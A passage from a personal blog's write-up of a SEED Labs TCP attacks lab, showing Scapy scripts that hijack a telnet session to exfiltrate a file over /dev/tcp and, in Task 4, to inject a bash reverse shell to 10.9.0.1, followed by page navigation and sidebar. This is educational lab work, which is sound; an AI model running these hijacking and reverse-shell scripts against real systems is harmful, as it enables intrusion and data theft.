和 ack</span></span><br><span class="line">ip = IP(src=<span class="string">&quot;10.9.0.6&quot;</span>, dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">tcp = TCP(sport=<span class="number">46128</span>, dport=<span class="number">23</span>, flags=<span class="string">&quot;A&quot;</span>, seq=<span class="number">1791470944</span>, ack=<span class="number">1808897714</span>)</span><br><span class="line">data = <span class="string">&quot;\r cat secretfile &gt; /dev/tcp/10.9.0.1/9090 \r&quot;</span></span><br><span class="line">pkt = ip/tcp/data</span><br><span class="line">ls(pkt)</span><br><span class="line">send(pkt, iface=<span class="string">&quot;br-579a2284e98b&quot;</span>, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#自动脚本：</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_tcp</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="comment"># 嗅探来自于受害者主机的数据包，利用该数据包进行伪造，在 data 中注入恶意代</span></span><br><span class="line">    码.</span><br><span class="line">    ip = IP(src=pkt[IP].dst,dst=pkt[IP].src)</span><br><span class="line">    tcp = TCP(sport=pkt[TCP].dport, dport=<span class="number">23</span>, flags=<span class="string">&quot;A&quot;</span>, seq=pkt[TCP].ack+<span class="number">5</span>,</span><br><span class="line">              ack=pkt[TCP].seq)</span><br><span class="line">    data = <span class="string">&quot;\r cat secretfile &gt; /dev/tcp/10.9.0.1/9090 \r&quot;</span></span><br><span class="line">    pkt = ip/tcp/data</span><br><span class="line">    <span class="comment"># ls(pkt)</span></span><br><span class="line">    send(pkt, iface=<span class="string">&quot;br-579a2284e98b&quot;</span>, verbose=<span class="number">0</span>)</span><br><span class="line">    pkt=sniff(iface=<span class="string">&#x27;br-579a2284e98b&#x27;</span>, <span class="built_in">filter</span>=<span class="string">&#x27;tcp and src host 10.9.0.5 and src port 23&#x27;</span>,</span><br><span class="line">              prn=spoof_tcp)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Task4</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_tcp</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="comment"># 利用嗅探到的数据包进行伪造数据包，根据实验手册的指导构造注入的恶意代</span></span><br><span class="line">    码。</span><br><span class="line">    ip = IP(src=pkt[IP].dst,dst=pkt[IP].src)</span><br><span class="line">    tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags=<span class="string">&quot;A&quot;</span>,</span><br><span class="line">              seq=pkt[TCP].ack+<span class="number">5</span>, ack=pkt[TCP].seq+<span class="built_in">len</span>(pkt[TCP].payload))</span><br><span class="line">    data = <span class="string">&quot;\r /bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1 \r&quot;</span></span><br><span class="line">    pkt = ip/tcp/data</span><br><span class="line">    <span class="comment"># ls(pkt)</span></span><br><span class="line">    send(pkt, iface=<span class="string">&quot;br-579a2284e98b&quot;</span>, verbose=<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># 嗅探来自于受害者主机 23 端口的数据包</span></span><br><span class="line">    pkt=sniff(iface=<span class="string">&#x27;br-579a2284e98b&#x27;</span>, <span class="built_in">filter</span>=<span class="string">&#x27;tcp and src host 10.9.0.5 and src port 23&#x27;</span>,</span><br><span class="line">              prn=spoof_tcp) </span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/seedlab2-0/" rel="tag"># seedlab2.0</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/11/12/Setuid/" rel="prev" title="Environment Variable and Set-UID">
+      <i class="fa fa-chevron-left"></i> Environment Variable and Set-UID
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/11/29/crypto_implementation/" rel="next" title="Crypto implementation Lab">
+      Crypto implementation Lab <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80-%E5%AE%9E%E9%AA%8C%E7%9B%AE%E6%A0%87"><span class="nav-number">1.</span> <span class="nav-text">一.实验目标</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C-%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">二.实验原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-TCP-x2F-IP%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 TCP&#x2F;IP协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E6%8B%93%E6%89%91%E6%90%AD%E5%BB%BA"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 拓扑搭建</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89-%E5%AE%9E%E9%AA%8C%E5%99%A8%E6%9D%90"><span class="nav-number">3.</span> <span class="nav-text">三.实验器材</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B-%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4%E5%8F%8A%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C"><span class="nav-number">4.</span> <span class="nav-text">四.实验步骤及运行结果</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-Task-1-SYN-Flooding-Attack"><span class="nav-number">4.1.</span> <span class="nav-text">4.1 Task 1: SYN Flooding Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#4-1-1-Task-1-1-Launching-the-Attack-Using-Python"><span class="nav-number">4.1.1.</span> <span class="nav-text">4.1.1 Task 1.1: Launching the Attack Using Python</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-1-2-Task-1-2-Launch-the-Attack-Using-C"><span class="nav-number">4.1.2.</span> <span class="nav-text">4.1.2 Task 1.2: Launch the Attack Using C</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-1-3-Task-1-3-Enable-the-SYN-Cookie-Countermeasure"><span class="nav-number">4.1.3.</span> <span class="nav-text">4.1.3 Task 1.3: Enable the SYN Cookie Countermeasure</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-Task-2-TCP-RST-Attacks-on-telnet-Connections"><span class="nav-number">4.2.</span> <span class="nav-text">4.2 Task 2: TCP RST Attacks on telnet Connections</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-Task-3-TCP-Session-Hijacking"><span class="nav-number">4.3.</span> <span class="nav-text">4.3 Task 3: TCP Session Hijacking</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-Task-4-Creating-Reverse-Shell-using-TCP-Session-Hijacking"><span class="nav-number">4.4.</span> <span class="nav-text">4.4 Task 4: Creating Reverse Shell using TCP Session Hijacking</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94-%E9%99%84%E4%BB%B6"><span class="nav-number">5.</span> <span class="nav-text">五.附件</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Crazyoo"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Crazyoo</p>
+  <div class="site-description" itemprop="description">You get what you get.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Crazyoo</span>
+</div>
+
+<!--
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div> -->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/three-waves.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
